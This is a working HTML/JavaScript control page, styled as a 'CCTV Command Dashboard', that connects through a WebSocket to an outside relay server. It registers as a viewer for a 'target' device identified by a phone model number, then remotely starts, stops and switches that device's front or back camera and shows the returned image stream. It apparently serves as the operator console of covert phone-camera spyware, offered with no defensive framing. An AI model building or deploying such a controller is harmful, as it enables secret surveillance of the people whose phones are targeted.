<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CCTV Command Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #0A0A0C; color: #F4F4F5;
            display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 15px;
        }
        .container {
            width: 100%; max-width: 460px; background: #13131A;
            border: 1px solid #22222E; border-radius: 28px; padding: 24px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); text-align: center;
        }
        h2 { font-size: 20px; font-weight: 700; color: #3B82F6; margin-bottom: 6px; letter-spacing: -0.5px; }
        .subtitle { font-size: 13px; color: #71717A; margin-bottom: 24px; }
        input {
            width: 100%; padding: 14px; border: 2px solid #22222E; border-radius: 14px;
            background: #181824; color: #FFF; font-size: 16px; font-weight: 600;
            text-align: center; margin-bottom: 16px; text-transform: uppercase;
        }
        input:focus { border-color: #3B82F6; outline: none; }
        
        /* Advanced iOS Control Panel Styles */
        .control-panel { display: none; margin-top: 10px; }
        .btn-group { display: flex; gap: 10px; margin-bottom: 15px; }
        
        button {
            width: 100%; padding: 14px; background: #3B82F6; color: #FFF;
            border: none; border-radius: 14px; font-size: 15px; font-weight: 700;
            cursor: pointer; transition: all 0.2s;
        }
        button:hover { opacity: 0.9; transform: translateY(-1px); }
        
        .btn-success { background: #10B981; }
        .btn-danger { background: #EF4444; }
        .btn-secondary { background: #27273A; border: 1px solid #3F3F46; }

        .video-box {
            width: 100%; aspect-ratio: 4/3; background: #000; border-radius: 18px;
            overflow: hidden; border: 1px solid #22222E; position: relative;
            display: flex; align-items: center; justify-content: center; margin-bottom: 15px;
        }
        img { width: 100%; height: 100%; object-fit: cover; display: none; }
        
        .status-bar {
            background: #181824; padding: 12px; border-radius: 12px;
            font-size: 13px; font-weight: 600; color: #A1A1AA;
            display: flex; align-items: center; justify-content: center; gap: 8px;
            border: 1px solid #22222E;
        }
        .dot { width: 8px; height: 8px; background: #52525B; border-radius: 50%; }
        .dot.active { background: #10B981; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
    </style>
</head>
<body>

    <div class="container">
        <div id="login-screen">
            <h2>CCTV Terminal Node</h2>
            <div class="subtitle">Enter target hardware architecture model</div>
            <input type="text" id="modelInput" value="RMX3870" />
            <button onclick="initializeTunnel()">Connect Tunnel Line</button>
        </div>

        <div id="control-screen" class="control-panel">
            <h2 id="titleLabel">RMX3870 Panel</h2>
            <div class="subtitle" id="deviceStateText">Checking hardware status...</div>

            <div class="btn-group">
                <button class="btn-success" onclick="sendControl('START_CAM')">Start Camera</button>
                <button class="btn-danger" onclick="sendControl('STOP_CAM')">Stop Camera</button>
            </div>
            <div class="btn-group">
                <button class="btn-secondary" onclick="switchCamera('BACK')">Back Lens</button>
                <button class="btn-secondary" onclick="switchCamera('FRONT')">Front Lens</button>
            </div>

            <div class="video-box">
                <div id="loader-msg" style="color:#52525B; font-size:14px;">Camera Stream Standby</div>
                <img id="monitorView" alt="Live Stream Buffer" />
            </div>

            <div class="status-bar">
                <span id="statusDot" class="dot"></span>
                <span id="statusLabel">Syncing Core Routing Layer...</span>
            </div>
        </div>
    </div>

<script>
    let ws;
    let targetModel = "";
    let currentLens = "BACK";

    function initializeTunnel() {
        targetModel = document.getElementById('modelInput').value.trim().toUpperCase();
        if(!targetModel) return alert("Enter model signature!");

        document.getElementById('login-screen').style.display = "none";
        const panel = document.getElementById('control-screen');
        panel.style.display = "block";
        document.getElementById('titleLabel').innerText = `${targetModel} Console`;

        const wsUrl = "wss://superx-oje2.onrender.com";
        ws = new WebSocket(wsUrl);
        ws.binaryType = 'blob';

        ws.onopen = () => {
            document.getElementById('statusLabel').innerText = "Tunnel connection up-link secure.";
            ws.send(JSON.stringify({ type: 'register_viewer', deviceModel: targetModel }));
        };

        ws.onmessage = (event) => {
            if (event.data instanceof Blob) {
                const url = URL.createObjectURL(event.data);
                const oldUrl = document.getElementById('monitorView').src;
                document.getElementById('monitorView').src = url;
                document.getElementById('monitorView').style.display = 'block';
                document.getElementById('loader-msg').style.display = 'none';
                if(oldUrl.startsWith('blob:')) URL.revokeObjectURL(oldUrl);
            } else {
                const packet = JSON.parse(event.data);
                if(packet.status === "connected") {
                    document.getElementById('deviceStateText').innerText = `Device Terminal State: ${packet.deviceState}`;
                    document.getElementById('statusLabel').innerText = "Streaming matrix standby.";
                    document.getElementById('statusDot').className = "dot active";
                }
                if(packet.status === "app_online") {
                    document.getElementById('deviceStateText').innerText = "Device Terminal State: ONLINE";
                }
                if(packet.status === "offline") {
                    document.getElementById('deviceStateText').innerText = "Device Terminal State: OFFLINE";
                    document.getElementById('monitorView').style.display = 'none';
                    document.getElementById('loader-msg').style.display = 'block';
                }
            }
        };
    }

    function sendControl(actionCode) {
        if(ws && ws.readyState === 1) {
            ws.send(JSON.stringify({
                type: 'control_cmd',
                deviceModel: targetModel,
                action: actionCode,
                cameraFacing: currentLens
            }));
        }
    }

    function switchCamera(lensCode) {
        currentLens = lensCode;
        sendControl('START_CAM'); // Lens update karte hi dynamic restart trigger instruction
    }
</script>
</body>
</html>
